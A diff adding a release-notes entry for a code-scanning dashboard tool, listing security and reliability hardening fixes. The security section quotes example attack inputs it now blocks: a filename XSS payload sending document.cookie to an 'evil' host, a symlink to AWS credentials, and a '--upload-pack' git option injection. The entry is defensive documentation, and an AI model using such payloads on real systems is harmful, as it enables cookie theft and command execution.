@@ -1,5 +1,81 @@
 # Changelog
 
+## 0.2.1 — 2026-09-17
+
+Hardening release from four independent senior reviews (QA, backend,
+security, roadmap devil's-advocate). 14 fixes across correctness,
+supply chain, XSS, and HTTP surface. No new features.
+
+**Correctness (blockers)**
+- `FileIndex.generation` monotonic int replaces `id(FileIndex)` as the
+  cache-invalidation key across `IncrementalScanner`, `DupBlock`, and
+  `NoTestForPublic`. CPython arena reuse can hand a freed id back to a
+  new object → previous cache design could serve stale windows /
+  findings after a parse-error → re-parse cycle. Monotonic ints never
+  collide within a process.
+- `_watch_loop` in `cockpit serve` now wraps every scan and every poll
+  cycle in try/except with a stderr traceback. A crashed `_scan` used
+  to kill the daemon thread silently, leaving `scanning=True`, the
+  pulse dot stuck on "scanning…", and no phase transitions in
+  `/system.json`. New `_safe_scan` helper always clears `scanning` and
+  emits `idle` in the `finally` block.
+- `baseline.load` catches `JSONDecodeError`, `UnicodeDecodeError`,
+  `OSError`, wrong-schema, and non-list `ids` — logs to stderr, returns
+  `None`. Prior version raised into the watch thread and crashed the
+  daemon on a corrupt `.cockpit/baseline.json`.
+
+**Security**
+- Filename XSS via HTML-attribute injection: `esc()` in `serve.py` and
+  `ui.py` now escapes `"` and `'` (was `& < >` only). A repo file
+  called `a"onmouseover="fetch('//evil/'+document.cookie)"b.py` no
+  longer executes JS in the local dashboard when the row is hovered.
+- Symlink escape (`scanner._walk`): `if p.is_symlink(): continue`
+  runs before `is_file()`. Also filters symlinks from the git-tracked
+  set. Prevents `evil.py -> /home/user/.aws/credentials` from being
+  read and served in the `evidence.snippet`.
+- `changeset.from_git_diff` refs go through `_safe_ref()`: rejects
+  refs starting with `-`, containing `..`, or any character outside
+  `\w./@^~+-`. Argument list ends with `--` so a value like
+  `--upload-pack=/tmp/evil` can never be interpreted as a git option.
+- `pyproject.toml`: `tree-sitter>=0.23,<0.30`,
+  `tree-sitter-python>=0.23,<0.30`. Unpinned major deps ship native
+  code — an unbounded pin is a silent supply-chain risk at
+  `pip install`. Bump the ceilings deliberately after testing.
+
+**HTTP server**
+- `_Handler.timeout = 15` — kills slowloris (`BaseHTTPRequestHandler`
+  had no timeout).
+- `_send()` wraps writes in try/except for `BrokenPipeError` /
+  `ConnectionAbortedError` / `ConnectionResetError` — a client that
+  disconnects mid-25s long-poll no longer prints to stderr.
+- Malformed `?since=abc` on `/state.json` returns 400 instead of
+  raising a 500-forming `ValueError`.
+- `/state.json` returns **503** past `MAX_WAITERS = 64` concurrent
+  long-poll clients. Prevents thread exhaustion under load; local dev
+  never notices the cap.
+- Host-header allowlist rejects DNS-rebinding attempts. Populated by
+  `cmd_serve` with `127.0.0.1:port`, `localhost:port`, and the
+  explicit `--host` value when non-loopback. Empty allowlist (rare)
+  disables the check.
+- Security headers on every response: `X-Content-Type-Options: nosniff`,
+  `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`. HTML
+  responses also get a Content-Security-Policy that limits network
+  targets to `'self'` and blocks `frame-ancestors`.
+- `Server:` header rewritten from `BaseHTTP/0.6 Python/3.11.x` to
+  `cockpit` — no version fingerprint.
+- `do_HEAD` supported for health checks.
+- `--host 0.0.0.0` prints an explicit stderr warning about unauthed
+  source-snippet exposure and recommends restricting to Tailscale.
+- `httpd.shutdown()` called on Ctrl-C for graceful drain.
+
+**Tests (+20)**
+- `tests/test_hardening.py` locks every fix as a regression:
+  monotonic-generation coverage, corrupt-baseline handling, argv
+  injection refusal (9 parametrised cases), symlink skip (2 tests,
+  auto-skip on Windows without symlink privilege), esc() attribute
+  escapes, DNS-rebinding rejection, malformed `since` → 400, watch
+  loop survives scan exceptions.
+
 ## 0.2.0 — 2026-09-16
 
 Live dashboard + machine receipt + a 27× speedup on the developer loop.
